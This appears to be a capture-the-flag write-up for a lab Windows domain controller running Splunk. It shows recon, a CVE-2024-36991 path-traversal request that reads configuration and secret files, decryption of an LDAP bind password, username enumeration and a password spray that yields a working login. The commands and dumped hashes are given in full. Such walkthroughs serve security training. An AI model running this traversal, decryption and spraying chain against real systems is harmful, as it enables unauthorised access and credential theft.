## HOST RECON

53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-01 12:01:24Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp open  http          Splunkd httpd
8088/tcp open  ssl/http      Splunkd httpd
8089/tcp open  ssl/http      Splunkd httpd

Host script results:
|_clock-skew: 8h00m00s
| smb2-time: 
|   date: 2025-04-01T12:02:14
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required



## WEB RECON

- http://10.10.11.61:8000/en-US/account/login?return_to=%2Fen-US%2F

- https://10.10.11.61:8089/
```
Splunk Atom Feed: splunkd
Updated: 2025-04-01T05:10:23-07:00 Splunk build: 9.2.1
```

#### exploring CVE-2024-36991 and get internal files

- https://www.sonicwall.com/blog/critical-splunk-vulnerability-cve-2024-36991-patch-now-to-prevent-arbitrary-file-reads

- https://github.com/bigb0x/CVE-2024-36991

- https://x.com/chybeta/status/1809249794122215557/photo/1

- "/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd"

- hash type = 1800 sha512crypt $6$, SHA512 (Unix) 2

```
[VLUN] Vulnerable: http://10.10.11.61:8000/
:admin:$6$Ak3m7.aHgb/NOQez$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1::Administrator:admin:changeme@example.com:::20152
:edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152
:mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152
:paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152
```


- https://docs.splunk.com/Documentation/Splunk/9.4.0/Admin/Listofconfigurationfiles

```
└─$ curl http://10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/system/default/server.conf
#   Version 9.2.1
# DO NOT EDIT THIS FILE!
# Changes to default files will be lost on update and are difficult to
# manage and support.
#
# Please make any changes to system defaults by overriding them in
# apps or $SPLUNK_HOME/etc/system/local
# (See "Configuration file precedence" in the web documentation).
#
# To override a specific setting, copy the name of the stanza and
# setting to the file where you wish to override it.
#
# This file contains possible attributes and values to configure SSL
# and HTTP server options.
#


[general]
serverName=$COMPUTERNAME
sessionTimeout=1h
invalidateSessionTokensOnLogout = false
logoutCacheRefreshInterval = 30s
pass4SymmKey = changeme
pass4SymmKey_minLength = 12
# The following 'allowRemoteLogin' setting controls remote management of your splunk instance.
#  - If set to 'always', all remote logins are allowed.
#  - If set to 'never', only local logins to splunkd will be allowed. Note that this will still allow
#    remote management through splunkweb if splunkweb is on the same server.
#  - If set to 'requireSetPassword' (default behavior):
#     1. In the free license, remote login is disabled.
#     2. In the pro license, remote login is only disabled for the admin user that has not changed their default password
allowRemoteLogin=requireSetPassword

tar_format=gnutar

access_logging_for_phonehome=true
hangup_after_phonehome=false

listenOnIPv6 = no
connectUsingIpVersion = auto

useHTTPServerCompression = true
useHTTPClientCompression = true

defaultHTTPServerCompressionLevel = 6
skipHTTPCompressionAcl = 127.0.0.1 ::1

parallelIngestionPipelines = 1
pipelineSetSelectionPolicy = round_robin
pipelineSetWeightsUpdatePeriod = 30
pipelineSetNumTrackingPeriods = 5
pipelineSetChannelSetCacheSize = 12

instanceType = download
numThreadsForIndexInitExecutor = 16
cleanRemoteStorageByDefault = false

legacyCiphers = decryptOnly
decommission_search_jobs_wait_secs = 0
decommission_search_jobs_min_wait_ratio = 0.15

python.version = force_python3

regex_cache_hiwater = 2500

# Specify whether the search process can have a long lifespan
enable_search_process_long_lifespan = true

# Specify a change in which .conf file(s) can increase the generation
#  of search configuration.
# - those "true" .conf files are allowed
# - otherwise, the "false" or unlisted .conf files are denied
conf_generation_include.alert_actions     = true
conf_generation_include.authentication    = false
conf_generation_include.authorize         = true
conf_generation_include.collections       = true
conf_generation_include.commands          = true
conf_generation_include.datamodels        = true
conf_generation_include.event_renderers   = true
conf_generation_include.eventtypes        = true
conf_generation_include.federated         = true
conf_generation_include.fields            = true
conf_generation_include.global-banner     = false
conf_generation_include.health            = false
conf_generation_include.history           = false
conf_generation_include.html              = false
conf_generation_include.indexes           = true
conf_generation_include.limits            = true
conf_generation_include.literals          = true
conf_generation_include.lookups           = true
conf_generation_include.macros            = true
conf_generation_include.manager           = true
conf_generation_include.messages          = true
conf_generation_include.metric_alerts     = true
conf_generation_include.metric_rollups    = false
conf_generation_include.models            = true
conf_generation_include.multikv           = true
conf_generation_include.nav               = true
conf_generation_include.outputs           = true
conf_generation_include.panels            = true
conf_generation_include.passwd            = false
conf_generation_include.passwords         = false
conf_generation_include.props             = true
conf_generation_include.savedsearches     = true
conf_generation_include.searchbnf         = false
conf_generation_include.searchscripts     = true
conf_generation_include.segmenters        = true
conf_generation_include.tags              = true
conf_generation_include.telemetry         = false
conf_generation_include.tos               = false
conf_generation_include.times             = true
conf_generation_include.transforms        = true
conf_generation_include.transactiontypes  = true
conf_generation_include.ui-prefs          = false
conf_generation_include.ui-tour           = false
conf_generation_include.user-prefs        = false
conf_generation_include.views             = false
conf_generation_include.viewstates        = false
conf_generation_include.visualizations    = false
conf_generation_include.workflow_actions  = false
conf_generation_include.workload_pools    = true
conf_generation_include.workload_rules    = true
conf_generation_include.workload_policy   = true


encrypt_fields = "server: :sslKeysfilePassword", "server: :sslPassword", "server: :pass4SymmKey", "server: :password", "outputs:tcpout:sslPassword", "outputs:tcpout:socksPassword","outputs:indexer_discovery:pass4SymmKey", "outputs:tcpout:token", "inputs:SSL:password", "inputs:SSL:sslPassword", "inputs:http:sslPassword", "inputs:http:sslKeysfilePassword", "inputs:splunktcptoken:token", "alert_actions:email:auth_password", "app:credential:password", "app:credential:sslPassword", "passwords:credential:password", "passwords:credential:sslPassword", "authentication: :bindDNpassword", "authentication: :sslKeysfilePassword", "authentication: :attributeQuerySoapPassword", "authentication: :scriptSecureArguments", "authentication: :sslPassword", "authentication: :accessKey", "web:settings:privKeyPassword", "web:settings:sslPassword", "server:indexer_discovery:pass4SymmKey", "server:clustermanager:pass4SymmKey", "server:dmc:pass4SymmKey", "server:kvstore:sslKeysPassword", "indexes: :remote.s3.access_key", "indexes: :remote.s3.secret_key", "indexes: :remote.s3.kms.key_id", "indexes: :remote.azure.access_key", "indexes: :remote.azure.secret_key", "indexes: :remote.azure.client_id", "indexes: :remote.azure.client_secret", "indexes: :remote.azure.tenant_id", "outputs: :remote.s3.access_key", "outputs: :remote.s3.secret_key", "outputs: :remote.s3.kms.key_id", "outputs: :remote.azure.access_key", "outputs: :remote.azure.secret_key", "outputs: :remote.azure.client_id", "outputs: :remote.azure.client_secret", "outputs: :remote.azure.tenant_id","server:scs:kvservice.principal.client.secret", "federated: :password"

[cascading_replication]
max_replication_threads = auto
max_replication_jobs = 5
cascade_replication_plan_reap_interval = 1h
cascade_replication_plan_age = 8h
cascade_replication_plan_fanout = auto
cascade_replication_plan_topology = size_balanced
cascade_replication_plan_select_policy = random
pass4SymmKey_minLength = 12

[sslConfig]
enableSplunkdSSL = true
useClientSSLCompression = false
useSplunkdClientSSLCompression = true
cliVerifyServerName = false
sslVerifyServerName = false
caTrustStore = splunk
# enableSplunkSearchSSL has been moved to web.conf/[settings]/enableSplunkWebSSL

# SSL settings
# The following provides modern TLS configuration. This configuration drops support
# for old Splunk versions (Splunk 5.x and earlier).
# To add support for Splunk 5.x:
#     - set sslVersions & sslVersionsForClient to tls
#     - and add AES256-SHA to the cipherSuite
# The following non-forward-secrecy ciphers were added to support the kv store:
#     AES256-GCM-SHA384:AES128-GCM-SHA256:AES128-SHA256.
sslVersions = tls1.2
sslVersionsForClient = tls1.2
cipherSuite = ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDH-ECDSA-AES256-GCM-SHA384:ECDH-ECDSA-AES128-GCM-SHA256:ECDH-ECDSA-AES128-SHA256:AES256-GCM-SHA384:AES128-GCM-SHA256:AES128-SHA256
ecdhCurves = prime256v1, secp384r1, secp521r1

sendStrictTransportSecurityHeader = false
allowSslCompression = true
allowSslRenegotiation = true

serverCert = $SPLUNK_HOME\etc\auth\server.pem
sslPassword = password
caCertFile = $SPLUNK_HOME\etc\auth\cacert.pem
certCreateScript = $SPLUNK_HOME\bin\splunk, createssl, server-cert
# DEPRECATED
caPath = $SPLUNK_HOME\etc\auth
# end of [sslConfig]

[pythonSslClientConfig]
sslVerifyServerCert = false
sslVerifyServerName = false

[httpServer]

# defines the stylesheet relative URL to apply to default Atom feeds;
# set to 'none' to not write out xsl-stylesheet directive
atomFeedStylesheet = /static/atom.xsl

max-age = 3600
follow-symlinks = false
# reject web accesses over 2GB in length
max_content_length = 2147483648

# When HTTP client streams data to HTTP server, server will timeout write operation after
# streamInWriteTimeout seconds if it cannot make write progress.
streamInWriteTimeout = 5

acceptFrom = *

# Automatically tune these limits:
maxThreads = 0
maxSockets = 0

forceHttp10 = auto
crossOriginSharingPolicy =
crossOriginSharingHeaders =
x_frame_options_sameorigin = true
allowBasicAuth = true
basicAuthRealm = /splunk
allowCookieAuth = true
allowWwwAuthHeader = true
cookieAuthHttpOnly = true
cookieAuthSecure = true
cookieSameSiteSecure = false
allowEmbedTokenAuth = true
dedicatedIoThreads = auto
keepAliveIdleTimeout = 7200
busyKeepAliveIdleTimeout = 12

[mimetype-extension-map]
gif = image/gif
html = text/html
htm = text/html
jpg = image/jpg
png = image/png
txt = text/plain
xml = text/xml
xsl = text/xml

[applicationsManagement]
allowInternetAccess = true
url = https://apps.splunk.com/api/apps
loginUrl = https://apps.splunk.com/api/account:login/
detailsUrl = https://apps.splunk.com/apps/id
updateHost = https://apps.splunk.com
updatePath = /api/apps:resolve/checkforupgrade
updateTimeout = 24h
caCertFile = $SPLUNK_HOME\etc\auth\appsCA.pem
caTrustStore = splunk
sslVerifyServerCert = true
sslVerifyServerName = false
sslCommonNameToCheck = splunkbase.splunk.com, apps.splunk.com, cdn.apps.splunk.com
sslAltNameToCheck = splunkbase.splunk.com, apps.splunk.com, cdn.apps.splunk.com

# The following provides modern TLS configuration that guarantees forward-
# secrecy and efficiency. This configuration drops support for old Splunk
# versions (e.g. Splunk 5.x).
# To add support for Splunk 5.x set sslVersions to tls and add this to the
# end of cipherSuite:
#     DHE-RSA-AES256-SHA:AES256-SHA:DHE-RSA-AES128-SHA:AES128-SHA
# and this, in case Diffie Hellman is not configured:
#     AES256-SHA:AES128-SHA
sslVersions = tls1.2
cipherSuite = ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256
ecdhCurves = prime256v1, secp384r1, secp521r1

# disk usage processor settings
[diskUsage]
minFreeSpace = 5000
pollingFrequency = 100000
pollingTimerFrequency = 10

[diag]
# don't capture local auth information in troubleshooting files
EXCLUDE-auth = *\etc\auth\*
# don't capture the index files for lookups either (big! unlikely to help)
EXCLUDE-lookup-indexes = *\etc\*\lookups\*.tsidx
# don't capture ops.json for now, until we add password hash redaction.
EXCLUDE-opsjson = *\etc\system\replication\ops.json

upload_proto_host_port = https://api.splunk.com

#######
# Search string redaction.  These defaults are an unavoidably incomplete
# (best-effort) Splunk diag attempt to avoid capturing sensitive information
# present in search queries.  This applies to situations where people enter
# field values or search terms interactively, or where they drill down into a
# table, dataset, pivot entry etc. to filter on specific values.

# To ensure sensitive data in your environment that can occur in search queries
# will not be present in Splunk diag output, you can add pattern-based
# filtering for those terms or values.

# Note that Splunk diag tries hard not to capture event text in general, by
# avoiding capture of search results, lookup files, and certain types of
# diagnostics of index files by default.

# If you find yourself wanting to add an additional pattern, be sure to match
# only the bytes relevant to your data, not any additional characters.  Each
# match "consumes" a portion of the search string, so additional matched bytes
# could prevent other matches from operating.


# Rough catchall for larger number strings with separators which are
# 1: More likely to be an identifier than a simple larger number
# eg. no : 32424234242342342423424234233
#     yes: 2334-243-24234-43-234-423-342
# 2: Unlikely to be numbers that are needed for troubleshooting, like limit=5000000
# 3: Probably not IP addresses, or similar pretty useful information that isn't
# typically PII (personally identifying information)
SEARCHFILTERSIMPLE-pii = \b[-_\d]{2,}\d{3,}[-_]\d{3,}[-_\d]{2,}\b


# US social security numbers fit a well-known format and predate common
# practices for automatic validation/verification
SEARCHFILTERSIMPLE-socsec = \b\d{3}[-. ]\d{2}[-. ]\d{4}\b

# Payment card numbers as displayed for human readability may contain embedded
# dashes or spaces in them, though have many different clusterings of numbers
# across the separators internationally.  Probably most payment card data does
# not arrive in Splunk indexes at all, but when it does, it is usually a single
# number and will be caught by bignum, following.
SEARCHFILTERLUHN-paycard = \b(?:\d{4}[- ]){3}\d{3,4}\b

# Any significantly large string of only numbers which satisfies the Luhn
# algorithm is *probably* a financial number, though unfortunately the
# false-positive rate will be 10%.  This may lead to requests for unredacted
# snippets in some cases.
SEARCHFILTERLUHN-bignum = \b(?:\d{13,})\b

#
# default license configuration
# by default, this node is a manager that has a single
# peer (itself) and a single pool based on the single
# free stack that alots 100% to itself
#

[license]
manager_uri = self
# these timeouts only matter if you have a manager_uri set to remote manager
connection_timeout = 30
send_timeout = 30
receive_timeout = 30
squash_threshold = 2000
report_interval = 1m
strict_pool_quota = true
lm_ping_interval = 86400

[queue]
maxSize = 500KB
# look back time in minutes
cntr_1_lookback_time = 60s
cntr_2_lookback_time = 600s
cntr_3_lookback_time = 900s
# sampling interval is the same for all the counters of a particular queue
# and defaults to 1 sec
sampling_interval = 1s

[queue=fschangemanager_queue]
maxSize = 5MB
cntr_1_lookback_time = 60s
cntr_2_lookback_time = 600s
cntr_3_lookback_time = 900s
# sampling frequency is the same for all the counters of a particular queue
# and defaults to 1 sec
sampling_interval = 1s

[queue=AQ]
maxSize = 10MB
# look back time in minutes
cntr_1_lookback_time = 60s
cntr_2_lookback_time = 600s
cntr_3_lookback_time = 900s
# sampling frequency is the same for all the counters of a particular queue
# and defaults to 1 sec
sampling_interval = 1s

[queue=WEVT]
maxSize = 5MB
# look back time in minutes
cntr_1_lookback_time = 60s
cntr_2_lookback_time = 600s
cntr_3_lookback_time = 900s
# sampling frequency is the same for all the counters of a particular queue
# and defaults to 1 sec
sampling_interval = 1s

[queue=aggQueue]
maxSize = 1MB
# look back time in minutes
cntr_1_lookback_time = 60s
cntr_2_lookback_time = 600s
cntr_3_lookback_time = 900s
# sampling frequency is the same for all the counters of a particular queue
# and defaults to 1 sec
sampling_interval = 1s

[queue=rfsQueue]
maxSize = 10MB

[queue=parsingQueue]
maxSize = 6MB
# look back time in minutes
cntr_1_lookback_time = 60s
cntr_2_lookback_time = 600s
cntr_3_lookback_time = 900s
# sampling frequency is the same for all the counters of a particular queue
# and defaults to 1 sec
sampling_interval = 1s

[queue=remoteOutputQueue]
maxSize = 10MB

[queue=vixQueue]
maxSize = 8MB

[clustering]
mode = disabled
manager_switchover_mode = disabled
pass4SymmKey =
register_replication_address =
register_forwarder_address =
register_search_address =
executor_workers = 10
manual_detention = off
summary_replication = false
allowed_hbmiss_count = 3
pass4SymmKey_minLength = 12

cm_heartbeat_period = 1
cm_max_hbmiss_count = 3
# lowlevel timeouts for CM-to-CM communication for redundancy purposes
cm_com_timeout = 10

# lowlevel timeouts for intra-cluster communication
cxn_timeout = 60
send_timeout = 60
rcv_timeout = 60

# replication channel timeouts
rep_cxn_timeout = 60
rep_send_timeout = 60
rep_rcv_timeout = 60
rep_max_send_timeout = 180
rep_max_rcv_timeout = 180

# only valid for mode=manager
service_interval = 0
max_fixup_time_ms = 1000
replication_factor = 3
search_factor = 2
heartbeat_timeout = 60
restart_timeout = 60
streaming_replication_wait_secs = 60
quiet_period = 60
reporting_delay_period = 30
max_peer_build_load = 2
max_peer_rep_load = 5
max_peer_sum_rep_load = 5
searchable_targets = true
searchable_target_sync_timeout = 60
target_wait_time = 150
summary_wait_time = 660
commit_retry_time = 300
percent_peers_to_restart = 10
percent_peers_to_reload = 100
max_peers_to_download_bundle = 5
precompress_cluster_bundle = true
multisite = false
site_replication_factor = origin:2, total:3
site_search_factor = origin:1, total:2
available_sites =
site_mappings =
constrain_singlesite_buckets=true
access_logging_for_heartbeats=false
auto_rebalance_primaries = true
rebalance_primaries_execution_limit_ms = 0
commit_generation_execution_limit_ms = 0
idle_connections_pool_size = -1
use_batch_mask_changes = true
service_jobs_msec = 100
rebalance_threshold = 0.90
max_auto_service_interval = 1
service_execution_threshold_ms = 1500
buckets_to_summarize = primaries
maintenance_mode = false
backup_and_restore_primaries_in_maintenance = false
max_primary_backups_per_service = 10
searchable_rolling_peer_state_delay_interval = 60
searchable_rolling_site_down_policy = half
allow_default_empty_p4symmkey = false
decommission_force_finish_idle_time = 0
rolling_restart = restart
searchable_rebalance = false
rebalance_pipeline_batch_size = 60
rebalance_primary_failover_timeout = 75
rebalance_newgen_propagation_timeout = 60
rebalance_search_completion_timeout = 180
deferred_cluster_status_update = true
assign_primaries_to_all_sites = false
log_bucket_during_addpeer = false
enable_primary_fixup_during_maintenance = true
freeze_during_maintenance = false
bucketsize_mismatch_strategy = largest
max_concurrent_peers_joining = 10
rolling_restart_condition = batch_adding
enable_parallel_add_peer = true
primary_src_persist_secs = 604800

#only valid for mode=manager or mode=searchhead
generation_poll_interval = 5

#only valid for mode=searchhead
generation_max_staleness = 60s

# only needed for mode=peer or mode=searchhead
manager_uri =

# only needed for mode=peer
heartbeat_period = 1
notify_scan_period = 10
notify_buckets_period = 10
enableS2SHeartbeat = true
s2sHeartbeatTimeout = 600
throwOnBucketBuildReadError = false
max_replication_errors = 3
search_files_retry_timeout = 600
re_add_on_bucket_request_error = false
decommission_search_jobs_wait_secs = 180
notify_scan_min_period = 10
summary_update_batch_size = 10
summary_registration_batch_size = 1000
decommission_node_force_timeout = 300
buckets_per_addpeer = 1000
max_nonhot_rep_kBps = 0
warm_bucket_replication_pre_upload = false
recreate_bucket_max_per_service = 20000
bucketsize_upload_preference = largest
upload_rectifier_timeout_secs = 2
ack_factor = 0
enable_encrypt_bundle = true

[introspection:generator:disk_objects]
disabled = true

[introspection:generator:disk_objects__summaries]
collectionPeriodInSecs = 1800

[introspection:generator:disk_objects__fishbucket]
disabled = false

[introspection:generator:disk_objects__bundle_replication]
disabled = false

[introspection:generator:resource_usage]
disabled = true

[introspection:generator:resource_usage__iostats]
disabled = true

[introspection:generator:resource_usage__iowait]
disabled = true

[introspection:generator:kvstore]
disabled = true

[introspection:distributed-indexes]
disabled = true
collectionPeriodInSecs = 3600

[shclustering]
disabled = true
register_replication_address =
executor_workers = 50
adhoc_searchhead = false
no_artifact_replications = false
precompress_artifacts = true
captain_is_adhoc_searchhead = false
async_replicate_on_proxy = true
preferred_captain = true
prevent_out_of_sync_captain = true
pass4SymmKey_minLength = 12
manual_detention = off

captain_dump_service_periods = 500
scheduling_heuristic = scheduler_load_based
long_running_jobs_poll_period = 600

election_timeout_ms = 60000
election_timeout_2_hb_ratio = 12
raft_rpc_backoff_time_ms = 5000

# lowlevel timeouts for intra-cluster communication
cxn_timeout = 60
send_timeout = 60
rcv_timeout = 60

# lowlevel timeouts for intra-cluster communication for the raft protocol
cxn_timeout_raft = 2
send_timeout_raft = 5
rcv_timeout_raft = 5


log_heartbeat_append_entries = false

# replication channel timeouts
rep_cxn_timeout = 60
rep_send_timeout = 60
rep_rcv_timeout = 60
rep_max_send_timeout = 600
rep_max_rcv_timeout = 600

# only valid for mode=manager
replication_factor = 3
heartbeat_timeout = 60
restart_timeout = 600
quiet_period = 60
max_peer_rep_load = 5
target_wait_time = 150
percent_peers_to_restart = 10
rolling_restart_with_captaincy_exchange = true
access_logging_for_heartbeats=false

rolling_restart = restart
decommission_search_jobs_wait_secs = 180

# only needed for mode=peer
heartbeat_period = 5
enableS2SHeartbeat = true
s2sHeartbeatTimeout = 600

#proxying related
sid_proxying = true
ss_proxying = true
ra_proxying = true
alert_proxying = true

csv_journal_rows_per_hb = 10000

#
# Replicate changes to UI- and search-related configurations.
#

conf_replication_period = 5
conf_replication_max_pull_count = 1000
conf_replication_max_push_count = 100
conf_replication_max_json_value_size = 15MB

conf_replication_include.alert_actions     = true
conf_replication_include.authentication    = true
conf_replication_include.authorize         = true
conf_replication_include.collections       = true
conf_replication_include.commands          = true
conf_replication_include.datamodels        = true
conf_replication_include.event_renderers   = true
conf_replication_include.eventtypes        = true
conf_replication_include.federated         = true
conf_replication_include.fields            = true
conf_replication_include.global-banner     = true
conf_replication_include.health            = true
conf_replication_include.history           = false
conf_replication_include.html              = true
conf_replication_include.limits            = true
conf_replication_include.literals          = true
conf_replication_include.lookups           = true
conf_replication_include.macros            = true
conf_replication_include.manager           = true
conf_replication_include.models            = true
conf_replication_include.multikv           = true
conf_replication_include.nav               = true
conf_replication_include.panels            = true
conf_replication_include.passwd            = true
conf_replication_include.passwords         = true
conf_replication_include.props             = true
conf_replication_include.savedsearches     = true
conf_replication_include.searchbnf         = true
conf_replication_include.searchscripts     = true
conf_replication_include.segmenters        = true
conf_replication_include.tags              = true
conf_replication_include.telemetry         = true
conf_replication_include.tos               = true
conf_replication_include.times             = true
conf_replication_include.transforms        = true
conf_replication_include.transactiontypes  = true
conf_replication_include.ui-prefs          = true
conf_replication_include.ui-tour           = true
conf_replication_include.user-prefs        = true
conf_replication_include.views             = true
conf_replication_include.viewstates        = true
conf_replication_include.workflow_actions  = true
conf_replication_include.workload_pools   = true
conf_replication_include.workload_rules   = true
conf_replication_include.workload_policy  = true
conf_replication_include.metric_rollups   = true
conf_replication_include.metric_alerts    = true
conf_replication_include.web-features     = true

# Includelists and excludelists for configuration replication summaries.
conf_replication_summary.includelist.refine.local = (system|(apps\*)|users(\_reserved)?\*\*)\(local\...|metadata\local.meta)
conf_replication_summary.includelist.passwd       = passwd
conf_replication_summary.includelist.lookups      = (system|(apps\*)|users(\_reserved)?\*\*)\lookups\*
conf_replication_summary.includelist.repo         = system\replication\*.json
conf_replication_summary.excludelist.lookup_index = (system|(apps\*)|users(\_reserved)?\*\*)\lookups\*.(tmp$|index($|\...))

conf_replication_summary.concerning_file_size = 50
conf_replication_summary.period = 1m

conf_replication_purge.eligibile_count = 20000
conf_replication_purge.eligibile_age = 1d
conf_replication_purge.period = 1h
conf_replication_find_baseline.use_bloomfilter_only = false

#
# Deploy configurations to search head cluster members.
#

conf_deploy_repository = $SPLUNK_HOME\etc\shcluster
conf_deploy_staging = $SPLUNK_HOME\var\run\splunk\deploy
conf_deploy_concerning_file_size = 50
conf_deploy_precompress_bundles = true

conf_deploy_fetch_url =
conf_deploy_fetch_mode = replace

artifact_status_fields = user, eai:acl.app , label

jobs_data_lite.enabled = true
jobs_data_lite.search_field_len = 100
jobs_data_lite.default_field_len = 1000000
jobs_data_lite.max_status_size_per_hb = 700

retry_autosummarize_or_data_model_acceleration_jobs = true
deployerPushThreads = 1
allow_concurrent_dispatch_savedsearch = true

[kvstore]

disabled = false

port = 8191
replicaset = splunkrs
sslVerifyServerCert = false
sslVerifyServerName = false

storageEngine=wiredTiger

storageEngineMigration = false
shutdownTimeout = 100
initAttempts = 300
initialSyncMaxFetcherRestarts = 0
delayShutdownOnBackupRestoreInProgress = false
oplogSize = 1000
dbPath = $SPLUNK_DB\kvstore
replicationWriteTimeout = 1800
clientConnectionTimeout = 10
clientSocketTimeout = 300
percRAMForCache = 15
clientConnectionPoolSize = 500



[cachemanager]
eviction_policy = lru
eviction_padding = 5120
max_cache_size = 0
hotlist_recency_secs = 86400
hotlist_bloom_filter_recency_hours = 360
evict_on_stable = false
batch_registration = true

[imds]
imds_version = v1

#
# Raft statemachine stanza
#
[raft_statemachine]
disabled = true
replicate_search_peers = false


[prometheus]
disabled = true

# Watchdog configuration
[watchdog]
disabled = false
responseTimeout = 8
actions =
actionsInterval = 1
pstacksEndpoint = true
usePreloadedPstacks = true

[watchdog:DispatchReaper]
responseTimeout = 30

[watchdog:SearchProcessReaper]
responseTimeout = 30

[watchdogaction:pstacks]
dumpAllThreads = true
stacksBufferSizeOrder = 14
maxStacksPerBlock = 60
batchStacksThreshold = auto

[watchdogaction:script]
path = ""
useShell = false
forceStop = false
forceStopOnShutdown = true

[node_auth]
signatureVersion = v1,v2

[federated_search]
disabled=false
transparent_mode=true
whole_search_execution_optimization=false

[app_backup]
backup_path = $SPLUNK_HOME\var\backup

[config_change_tracker]
disabled = false
mode=auto
log_throttling_disabled = true
log_throttling_threshold_ms = 10000


[distributed_leases]
sslVerifyServerCert = false
sslVerifyServerName = false
disabled = true


[search_state]
alert_store = local
suppression_store = local




[manager_pages]
sanitize_uri_param = true

[localProxy]
max_concurrent_requests = 10
response_timeout_ms = 600000

```


```
└─$ curl http://10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/system/local/authentication.conf
[splunk_auth]
minPasswordLength = 8
minPasswordUppercase = 0
minPasswordLowercase = 0
minPasswordSpecial = 0
minPasswordDigit = 0

[Haze LDAP Auth]
SSLEnabled = 0
anonymous_referrals = 1
bindDN = CN=Paul Taylor,CN=Users,DC=haze,DC=htb
bindDNpassword = $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=
charset = utf8
emailAttribute = mail
enableRangeRetrieval = 0
groupBaseDN = CN=Splunk_LDAP_Auth,CN=Users,DC=haze,DC=htb
groupMappingAttribute = dn
groupMemberAttribute = member
groupNameAttribute = cn
host = dc01.haze.htb
nestedGroups = 0
network_timeout = 20
pagelimit = -1
port = 389
realNameAttribute = cn
sizelimit = 1000
timelimit = 15
userBaseDN = CN=Users,DC=haze,DC=htb
userNameAttribute = samaccountname

[authentication]
authSettings = Haze LDAP Auth
authType = LDAP

```

```
└─$ curl http://10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/auth/splunk.secret   
NfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD 
```

#### Decrypt splunk password

- https://hurricanelabs.com/splunk-tutorials/make-splunk-do-it-how-to-decrypt-passwords-encrypted-by-splunk/
- https://jamesfette.com/2019/07/02/recovering_splunk_passwords/

- 1 you need ```password.conf``` or ```authentication.conf``` file located in ```/etc/system/local/``` that contains hash used for ldap auth.
- 2 need of splunk secret salt used in splunk passwords located in ```/etc/auth/splunk.secret
- 3 get these two and put in splunksecrets tool (https://github.com/HurricaneLabs/splunksecrets)

```
└─$ splunksecrets splunk-decrypt -S splunk.secret --ciphertext '$7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY='
Ld@p_Auth_Sp1unk@2k24
```

#### pass spray

- kerbrute and username wordlist of seclists dont find valid users

- i use this to put last name at list that we have before https://www.attackdebris.com/?p=364

```
2025/04/04 01:37:03 >  [+] VALID USERNAME:       paul.TAYLOR@haze.htb
2025/04/04 01:40:34 >  [+] VALID USERNAME:       edward.MARTIN@haze.htb
2025/04/04 01:42:00 >  [+] VALID USERNAME:       mark.ADAMS@haze.htb
```

```
└─$ netexec smb 10.10.11.61 -u users.txt -p 'Ld@p_Auth_Sp1unk@2k24' --continue-on-success
SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.61     445    DC01             [-] haze.htb\edward.martin:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE 
SMB         10.10.11.61     445    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 
